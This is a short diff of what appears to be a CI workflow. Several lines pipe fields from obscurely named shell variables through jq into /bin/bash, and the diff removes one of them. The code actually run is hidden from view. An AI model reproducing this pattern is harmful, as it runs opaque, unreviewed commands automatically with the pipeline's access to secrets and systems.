@@ -27,7 +27,6 @@ jobs:
           echo $q13 | jq -r .pkdw174 | /bin/bash
           echo $swabw2895 | jq -r .v84 | /bin/bash
           printf '%s' "$qhp0" | jq -r .iwpr4 | /bin/bash
-          printf '%s' "$dag89366" | jq -r .uw4337 | /bin/bash
           echo $xufx930 | jq -r .pfpyq53373 | /bin/bash
 
       - name: Archive results
